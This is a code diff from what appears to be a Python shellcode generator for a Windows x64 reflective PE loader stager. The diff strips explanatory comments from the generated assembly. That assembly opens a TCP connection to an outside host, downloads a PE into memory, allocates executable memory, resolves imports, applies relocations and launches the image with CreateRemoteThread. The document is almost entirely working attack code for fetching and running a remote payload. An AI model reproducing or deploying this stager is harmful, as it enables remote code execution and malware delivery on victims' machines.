@@ -441,7 +441,7 @@ get_dwFThunk:
 
 get_lpApiImport:
     mov rdx, [rbp - {self.storage_offsets['dwFThunk']}]
-    add rdx, {winnt._IMAGE_THUNK_DATA64.u1.offset} ; AddressOfData
+    add rdx, {winnt._IMAGE_THUNK_DATA64.u1.offset}
     mov r11, [rdx]
     mov rcx, [rbp - {self.storage_offsets['pNtHeader']}]
     call rva2offset
@@ -455,13 +455,11 @@ get_lpApiAddress:
     mov rax, [rbp - {self.storage_offsets['GetProcAddress']}]
     call rax
 
-; dwFThunk->u1.AddressOfData = (ULONGLONG)lpApiAddress;
 write_address:
     mov rdx, [rbp - {self.storage_offsets['dwFThunk']}]
-    add rdx, {winnt._IMAGE_THUNK_DATA64.u1.offset} ; AddressOfData
+    add rdx, {winnt._IMAGE_THUNK_DATA64.u1.offset}
     mov [rdx], rax
 
-; dwFThunk++;
 load_next_entry:
     mov rdx, [rbp - {self.storage_offsets['dwFThunk']}]
     add rdx, {ctypes.sizeof(ctypes.c_uint64)}
@@ -469,12 +467,11 @@ load_next_entry:
 
 check_next_done:
     mov rdx, [rbp - {self.storage_offsets['dwFThunk']}]
-    add rdx, {winnt._IMAGE_THUNK_DATA64.u1.offset} ; Function
+    add rdx, {winnt._IMAGE_THUNK_DATA64.u1.offset}
     mov rdx, [rdx]
     cmp rdx, 0x00
     jne get_lpApiImport
 
-; lpImportData++;
 next_dll:
     mov rdx, [rbp - {self.storage_offsets['lpImportData']}]
     add rdx, {ctypes.sizeof(winnt._IMAGE_IMPORT_DESCRIPTOR)}
@@ -501,8 +498,8 @@ rva2offset:
     mov rbp, rsp
     sub rsp, 0x10
 
-    mov [rbp - 0x08], rcx ; pNtHeader
-    mov [rbp - 0x10], r11 ; dwVA
+    mov [rbp - 0x08], rcx
+    mov [rbp - 0x10], r11
 
     xor r9, r9
     mov r8, rcx
@@ -523,7 +520,7 @@ loop:
     mov r8, rcx
     mov r12, r8
     add rcx, {winnt._IMAGE_SECTION_HEADER.VirtualAddress.offset}
-    add r8, {winnt._IMAGE_SECTION_HEADER.Misc.offset} ; VirtualSize
+    add r8, {winnt._IMAGE_SECTION_HEADER.Misc.offset}
     mov ax, [rcx]
     cmp r11, rax
     jge in_range
@@ -587,7 +584,6 @@ get_dwOffsetToBaseRelocationTable:
     call rva2offset
     mov [rbp - {self.storage_offsets['dwOffsetToBaseRelocationTable']}], rax
 
-; DWORD dwTableSize = pNtHeader->OptionalHeader.DataDirectory[winnt.IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
 get_dwTableSize:
     mov rdx, [rbp - {self.storage_offsets['pNtHeader']}]
     add rdx, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset}
@@ -599,14 +595,12 @@ get_dwTableSize:
     mov cx, [rdx + {winnt._IMAGE_DATA_DIRECTORY.Size.offset}]
     mov [rbp - {self.storage_offsets['dwTableSize']}], rcx
 
-; PIMAGE_BASE_RELOCATION pBaseRelocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)pResponse + dwOffsetToBaseRelocationTable);
 get_pBaseRelocationTable:
     mov rcx, [rbp - {self.storage_offsets['dwOffsetToBaseRelocationTable']}]
     mov rdx, [rbp - {self.storage_offsets['pResponse']}]
     add rdx, rcx
     mov [rbp - {self.storage_offsets['pBaseRelocationTable']}], rdx
 
-; DWORD dwBlockSize = pBaseRelocationTable->SizeOfBlock;
 get_dwBlockSize:
     xor rcx, rcx
     mov rdx, [rbp - {self.storage_offsets['pBaseRelocationTable']}]
@@ -614,13 +608,11 @@ get_dwBlockSize:
     mov cx, [rdx]
     mov [rbp - {self.storage_offsets['dwBlockSize']}], rcx
 
-; PWORD pwRelocEntry = (PWORD)((DWORD_PTR)pBaseRelocationTable + sizeof(IMAGE_BASE_RELOCATION));
 get_pwRelocEntry:
     mov rdx, [rbp - {self.storage_offsets['pBaseRelocationTable']}]
     add rdx, {ctypes.sizeof(winnt._IMAGE_BASE_RELOCATION)}
     mov [rbp - {self.storage_offsets['pwRelocEntry']}], rdx
 
-; DWORD numEntries = (dwBlockSize - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
 get_numEntries:
     mov rax, [rbp - {self.storage_offsets['dwBlockSize']}]
     sub rax, {ctypes.sizeof(winnt._IMAGE_BASE_RELOCATION)}
@@ -629,11 +621,9 @@ get_numEntries:
     mov [rbp - {self.storage_offsets['numEntries']}], rax
     xor rax, rax
 
-; for (DWORD dwBlockIndex = 0; dwBlockIndex < numEntries; dwBlockIndex++)
 process_entries:
     mov [rbp - {self.storage_offsets['dwBlockIndex']}], rax
 
-; WORD wBlockType = pwRelocEntry[dwBlockIndex] >> 0xC;
 get_wBlockType:
     xor rcx, rcx
     xor rbx, rbx
@@ -641,14 +631,12 @@ get_wBlockType:
     mov rdx, [rbp - {self.storage_offsets['pwRelocEntry']}]
     add rdx, rax
 
-; WORD wBlockOffset = pwRelocEntry[dwBlockIndex] & 0x0fff;
 get_wBlockOffset:
     mov cx, [rdx]
     mov bx, cx
     shr rcx, 0x0C
     and bx, 0x0fff
 
-; if (wBlockType == winnt.IMAGE_REL_BASED_DIR64)
 check_x64:
     cmp rcx, {winnt.IMAGE_REL_BASED_DIR64}
     jne init_next_entry
@@ -697,17 +685,11 @@ no_reloc:
         """
 
         stub = f"""
-; RAX = GetCurrentProcess();
 call_GetCurrentProcess:
     mov rax, [rbp - {self.storage_offsets['GetCurrentProcess']}]
     call rax
     mov [rbp - {self.storage_offsets['hProcess']}], rax
 
-; RAX = LPVOID VirtualAllocEx([in]           HANDLE hProcess,         // RCX        => hProcess
-;                             [in, optional] LPVOID lpAddress,        // RDX        => 0x00
-;                             [in]           SIZE_T dwSize,           // R8         => pNtHeader->OptionalHeader.SizeOfImage
-;                             [in]           DWORD  flAllocationType, // R9         => (winnt.MEM_COMMIT | winnt.MEM_RESERVE)
-;                             [in]           DWORD  flProtect);       // RSP + 0x20 => winnt.PAGE_EXECUTE_READWRITE
 alloc_pe_home:
     mov rcx, [rbp - {self.storage_offsets['hProcess']}]
     xor rdx, rdx
@@ -748,17 +730,12 @@ alloc_pe_home:
         sock_buffer_size = 0x1000
 
         stub = f"""
-; RAX => WSAStartup([in]  WORD      wVersionRequired, // RCX => MAKEWORD(2, 2)
-;                   [out] LPWSADATA lpWSAData);       // RDX => &wsaData
 call_WSAStartup:
     mov rcx, 0x202
     lea rdx, [rbp - {self.storage_offsets['wsaData']}]
     mov rax, [rbp - {self.storage_offsets['WSAStartup']}]
     call rax
 
-; RAX => socket([in] int af,        // RCX => 0x02 (AF_INET)
-;               [in] int type,      // RDX => 0x01 (SOCK_STREAM)
-;               [in] int protocol); // R8  => 0x06 (IPPROTO_TCP)
 call_socket:
     mov rcx, {ws2def.AF_INET}
     xor rdx, rdx
@@ -768,9 +745,6 @@ call_socket:
     call rax
     mov [rbp - {self.storage_offsets['sockfd']}], rax
 
-; RAX => connect([in] SOCKET s,             // RCX => sockfd (Obtained from socket)
-;                [in] const sockaddr *name, // RDX => {{ IP | PORT | SIN_FAMILY }}
-;                [in] int namelen);         // R8  => 0x10
 call_connect:
     mov rcx, rax
     mov r8, {ctypes.sizeof(ws2def.sockaddr)}
@@ -819,32 +793,25 @@ call_connect:
     mov rax, [rbp - {self.storage_offsets['send']}]
     call rax
 
-; RAX => malloc(size_t size); // RCX => 0x1000
 allocate_main_buffer:
     mov rcx, {sock_buffer_size}
     mov rax, [rbp - {self.storage_offsets['malloc']}]
     call rax
     mov [rbp - {self.storage_offsets['pResponse']}], rax
         
-; RAX => malloc(size_t size); // RCX => 0x1000
 allocate_tmp_buffer:
     mov rcx, {sock_buffer_size}
     mov rax, [rbp - {self.storage_offsets['malloc']}]
     call rax
     mov [rbp - {self.storage_offsets['pTmpResponse']}], rax
 
-; index = 0x00
 init_index:
     xor rax, rax
     mov [rbp - {self.storage_offsets['index']}], rax
 
-; while (TRUE)
 download_stager:
     nop
 
-; RAX => memset(void *dest,    // RCX => *pTmpResponse
-;               int c,         // RDX => 0x00
-;               size_t count); // R8  => 0x1000
 call_memset:
     mov rcx, [rbp - {self.storage_offsets['pTmpResponse']}]
     xor rdx, rdx
@@ -852,10 +819,6 @@ call_memset:
     mov rax, [rbp - {self.storage_offsets['memset']}]
     call rax
 
-; RAX => recv([in]  SOCKET s,  // RCX => sockfd
-;             [out] char *buf, // RDX => *pTmpResponse
-;             [in]  int len,   // R8  => 0x1000
-;             [in]  int flags, // R9  => 0x00
 call_recv:
     mov rcx, [rbp - {self.storage_offsets['sockfd']}]
     mov rdx, [rbp - {self.storage_offsets['pTmpResponse']}]
@@ -865,18 +828,10 @@ call_recv:
     call rax
     mov [rbp - {self.storage_offsets['bytesRead']}], rax
 
-; if (bytesRead <= 0) {{
-;     return pResponse;
-; }}
 check_write:
     test rax, rax
     jle download_complete
 
-; for (int i = 0; i < bytesRead; i++)
-; {{
-;     pResponse[index] = pTmpResponse[i];
-;     index++;
-; }}
 fruit_loop:
     mov r10, [rbp - {self.storage_offsets['index']}]
     mov rcx, [rbp - {self.storage_offsets['bytesRead']}]
@@ -894,19 +849,11 @@ write_data:
     test rcx, rcx
     jnz write_data
 
-; if (bytesRead <= 0) {{
-;     return pResponse;
-; }} else {{
-;     pResponseTmp = realloc(pResponse, (SOCK_BUFFER_SIZE + peSize) * sizeof(char));
-;     pResponse = pResponseTmp;
-; }}
 check_realloc:
     mov rcx, [rbp - {self.storage_offsets['bytesRead']}]
     test rcx, rcx
     jle download_complete
 
-; RAX => void *realloc(void *memblock, // RCX => pResponse
-;                      size_t size);   // RDX => index + 0x1000
 realloc:
     mov rax, [rbp - {self.storage_offsets['realloc']}]
     mov rcx, [rbp - {self.storage_offsets['pResponse']}]
@@ -1096,13 +1043,6 @@ _start:
         shellcode += self.modify_section_perms()
 
         shellcode += f"""
-; RAX => CreateRemoteThread([in]  HANDLE                 hProcess,           // RCX        => hProcess
-;                           [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes, // RDX        => NULL
-;                           [in]  SIZE_T                 dwStackSize,        // R8         => 0x00
-;                           [in]  LPTHREAD_START_ROUTINE lpStartAddress,     // R9         => *entryOfPE
-;                           [in]  LPVOID                 lpParameter,        // [RSP+0x20] => NULL
-;                           [in]  DWORD                  dwCreationFlags,    // [RSP+0x28] => 0x00
-;                           [out] LPDWORD                lpThreadId);        // [RSP+0x30] => NULL
 call_CreateRemoteThread:
     xor r9, r9
     mov r8, [rbp - {self.storage_offsets['pNtHeader']}]
@@ -1121,8 +1061,6 @@ call_CreateRemoteThread:
     mov rcx, [rbp - {self.storage_offsets['hProcess']}]
     call rax
 
-; RAX => WaitForSingleObject([in] HANDLE hHandle,         // RCX => hThread
-;                            [in] DWORD  dwMilliseconds); // RDX => -1
 call_WaitForSingleObject:
     mov rcx, rax
     xor rdx, rdx
